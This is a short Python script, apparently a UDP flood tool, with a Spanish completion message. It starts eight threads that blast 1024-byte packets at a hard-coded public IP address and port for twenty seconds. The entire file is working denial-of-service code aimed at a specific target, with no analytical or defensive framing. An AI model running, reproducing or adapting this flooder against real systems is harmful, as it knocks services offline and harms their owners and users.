import socket
import threading
import time

def flood_udp(ip, port, duration=10, threads=8):
    payload = b"A" * 1024
    end_time = time.time() + duration

    def sender():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
        sock.close()

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=sender)
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()

if __name__ == "__main__":
    flood_udp("144.76.58.217", 31009, duration=20, threads=8)
    print("Envío finalizado.")
